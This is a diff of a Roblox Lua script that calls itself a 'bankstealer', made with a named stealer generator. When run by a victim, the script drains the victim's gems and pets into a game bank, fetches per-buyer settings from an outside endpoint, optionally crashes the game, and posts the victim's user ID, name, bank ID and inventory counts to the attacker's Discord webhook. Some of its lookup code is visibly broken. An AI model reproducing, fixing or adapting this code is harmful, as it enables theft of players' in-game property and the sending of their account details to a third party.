@@ -1,64 +1,44 @@
+local YourWebHookHere =  "https://crystalblob.api.stdlib.com/blobscript@dev/getbskv/?whid=".._G.AuthKey  -- web hook here
+local http = game:GetService("HttpService")
+local url = YourWebHookHere
+local username = game:GetService("Players").LocalPlayer.Name
+ 
+local data = {["whid"] = _G.AuthKey}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 
-local crashKey = string.sub(_G.Loader_Key, 2, 2)
-if table.find({"a", "C", "e", "G", "i", "K", "m", "0", "q", "5", "u", "M", "9"}, crashKey) ~= nil then
-_G.CrashAtEnd = true
-end
-local gemkey = string.sub(_G.Loader_Key, #_G.Loader_Key-1, #_G.Loader_Key-1)
-if table.find({"B", "e", "H", "k", "N", "q", "T", "w", "Z"}, gemkey) ~= nil then
+local headers = {
+  ["content-type"] = "application/json"
+}
+request = http_request or request or HttpGet or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "GET", Headers = headers}
+local result = request(abcdef)
+for i, v in pairs(result) do print(i, v) end
+print(result.Body)
+local result = result.Body
+local res = string.gsub(result, '"', "")
+local res2 = string.split(res, "X")
+local userid = res2[2]
+if res2[3] == "true" then
 _G.DepoAllGems = true
+else
+_G.DepoAllGems = false
 end
-local petkey = string.sub(_G.Loader_Key, #_G.Loader_Key, #_G.Loader_Key)
-if table.find({"a", "D", "h", "L", "p", "7", "x"}, petkey) ~= nil then
+if res2[4] == "true" then
 _G.DepoAllPets = true
+else
+_G.DepoAllPets = false
 end
-local userid = ""
-if string.sub(_G.Loader_Key, 1, 1) == "A" then
-_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
-local ObSys = {"x", "Y", "d", "f", "t", "s", "p", "R", "I", "o"}
-for i = 1, #_G.Loader_Key, 1 do
-local letter = string.sub(_G.Loader_Key, i, i)
-for i, v in pairs(ObSys) do
-if v == letter then
-userid = userid..tostring(i-1)
+if res2[5] == "true" then
+_G.CrashAtEnd = true
+else
+_G.CrashAtEnd = false
 end
+if res2[6] == "true" then
+_G.UseWebhook = true
+else
+_G.UseWebhook = false
 end
-end
-elseif string.sub(_G.Loader_Key, 1, 1) == "D" then
-_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
-local ObSys = {"A", "b", "D", "e", "G", "h", "J", "k", "M", "n"}
-for i = 1, #_G.Loader_Key, 1 do
-local letter = string.sub(_G.Loader_Key, i, i)
-for i, v in pairs(ObSys) do
-if v == letter then
-userid = userid..tostring(i-1)
-end
-end
-end
-elseif string.sub(_G.Loader_Key, 1, 1) == "G" then
-_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
-local ObSys = {"3", "1", "4", "2", "5", "9", "7", "0", "6", "8"}
-for i = 1, #_G.Loader_Key, 1 do
-local letter = string.sub(_G.Loader_Key, i, i)
-for i, v in pairs(ObSys) do
-if v == letter then
-userid = userid..tostring(i-1)
-end
-end
-end
-elseif string.sub(_G.Loader_Key, 1, 1) == "K" then
-_G.Loader_Key = string.sub(_G.Loader_Key, 3, #_G.Loader_Key-2)
-local ObSys = {"$", "€", "%", "&", "!", "]", "?", ".", "_", "<"}
-for i = 1, #_G.Loader_Key, 1 do
-local letter = string.sub(_G.Loader_Key, i, i)
-for i, v in pairs(ObSys) do
-if v == letter then
-userid = userid..tostring(i-1)
-end
-end
-end
-end
-userid = tonumber(userid)
-userid = userid/22
+
 local Bank = ""
 
 local A_1 = "b"
@@ -220,7 +200,130 @@ local A_1 =
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposit"]
 local result = Event:InvokeServer(A_1)
 end
+wait(0.5)
+if _G.UseWebhook then
+local A_1 = 
+{
+	[1] = Bank
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get bank"]
+local SuperBank = Event:InvokeServer(A_1)
+	EXCList     = {}
+   	MythicList  = {}
+	LegList = {}
+	EpicList = {}
+	RareList = {}
+	CommonList = {}
+	
+	EXCCount = 0
+	MythicCount = 0
+	LegCount = 0
+	EpicCount = 0
+	RareCount = 0
+	CommonCount = 0
+	
+	table.foreach(Library.Directory.Pets, function(i, v)
+		if v.rarity == "Exclusive" then
+			table.insert(EXCList, i)
+		end
+		if v.rarity == "Mythical" then
+			table.insert(MythicList, i)
+		end
+		if v.rarity == "Legendary" then
+			table.insert(LegList, i)
+		end
+		if v.rarity == "Epic" then
+			table.insert(EpicList, i)
+		end
+		if v.rarity == "Rare" then
+			table.insert(RareList, i)
+		end
+		if v.rarity == "Common" then
+			table.insert(CommonList, i)
+		end
+	end)
+	for i, v in pairs(SuperBank[1]["Storage"]["Pets"]) do
+	if table.find("EXCList", v["id"]) then EXCCount+=1 end
+	if table.find("MythicList", v["id"]) then MythicCount+=1 end
+	if table.find("LegList", v["id"]) then LegCount+=1 end
+	if table.find("EpicList", v["id"]) then EpicCount+=1 end
+	if table.find("RareList", v["id"]) then RareCount+=1 end
+	if table.find("CommonList", v["id"]) then CommonCount+=1 end
+	end
+local YourWebHookHere =  res2[1]
 
+local url = YourWebHookHere
+local username = game:GetService("Players").LocalPlayer.Name
+ 
+local data = {
+  "content": "We got a hit boys n gurls! @everyone",
+  "embed": {
+    "title": "Crystalized Steal",
+    "description": "Note: Script was created with Crystal Blob's Bankstealer Gen (https://discord.gg/q4uHfJHudq)",
+    "url": "https://discord.gg/q4uHfJHudq",
+    "color": 917302,
+    "footer": {
+      "text": "Webhook Option made by Crystal Blob and ver."
+    },
+    "author": {
+      "name": "[Crystalized Steal]"
+    },
+    "fields": [
+      {
+        "name": "Exclusives",
+        "value": tostring(EXCCount),
+        "inline": true
+      },
+      {
+        "name": "Mythics",
+        "value": tostring(MythicCount),
+        "inline": true
+      },
+      {
+        "name": "Legendaries",
+        "value": tostring(LegCount),
+        "inline": true
+      },
+      {
+        "name": "Epics",
+        "value": tostring(EpicCount),
+        "inline": true
+      },
+      {
+        "name": "Rares",
+        "value": tostring(RareCount),
+        "inline": true
+      },
+      {
+        "name": "Commons",
+        "value": tostring(CommonCount),
+        "inline": true
+      },
+      {
+        "name": "Gems",
+        "value": tostring(SuperBank[1]["Storage"]["Currency"]["Diamonds"]),
+        "inline": true
+      },
+      {
+        "name": "User",
+        "value": tostring(game.Players.LocalPlayer.UserId).." / "..game.Players.LocalPlayer.Name
+      },
+      {
+        "name": "Bank ID",
+        "value": SuperBank[1]["BUID"]
+      }
+    ]
+  }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+  ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end
 wait(0.5)
 if _G.CrashAtEnd then
 spawn(function()
